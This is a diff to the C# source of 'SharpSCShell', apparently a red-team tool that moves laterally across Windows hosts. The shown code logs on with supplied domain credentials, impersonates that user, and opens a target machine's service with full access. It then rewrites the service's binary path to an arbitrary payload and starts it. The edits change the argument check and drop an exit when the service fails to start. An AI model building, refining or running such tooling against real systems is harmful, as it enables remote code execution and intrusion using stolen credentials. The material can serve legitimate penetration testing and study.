@@ -8,6 +8,7 @@ namespace SharpSCshell
 {
     class Program
     {
+
         [DllImport("advapi32.dll", SetLastError = true, BestFitMapping = false, ThrowOnUnmappableChar = true)]
         [return: MarshalAs(UnmanagedType.Bool)]
         internal static extern bool LogonUser(
@@ -148,7 +149,7 @@ namespace SharpSCshell
             Console.WriteLine();
             Console.WriteLine("=============== SharpSCShell --> Revised at Rcoil (C# version) =============== ");
             Console.WriteLine();
-            if (args.Length < 2)
+            if (args.Length < 3)
             {
                 Console.WriteLine("SharpSCShell.exe target service payload domain username password");
                 Environment.Exit(0);
@@ -180,6 +181,7 @@ namespace SharpSCshell
                     Environment.Exit(0);
                 }
             }
+
             bResult = ImpersonateLoggedOnUser(phToken);
             if (!bResult)
             {
@@ -196,6 +198,7 @@ namespace SharpSCshell
             Console.WriteLine("[*] SC_HANDLE Manager 0x{0}", SCMHandle);
 
             Console.WriteLine("[*] Opening {0} Service ....", ServiceName);
+
             IntPtr schService = OpenService(SCMHandle, ServiceName, ((uint)SERVICE_ACCESS.SERVICE_ALL_ACCESS));
             Console.WriteLine("[*] SC_HANDLE Service 0x{0}", schService);
 
@@ -221,6 +224,7 @@ namespace SharpSCshell
             Console.WriteLine("[*] Original service binary path \"{0}\"", originalBinaryPath);
             Marshal.FreeCoTaskMem(qscPtr);
 
+
             bResult = ChangeServiceConfigA(schService, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, payload, null, null, null, null, null, null);
             if (!bResult)
             {
@@ -235,7 +239,6 @@ namespace SharpSCshell
             if (!bResult && dwResult != 1053)
             {
                 Console.WriteLine("[!] StartServiceA failed to start the service. Error:{0}", GetLastError());
-                Environment.Exit(0);
             }
             else
             {
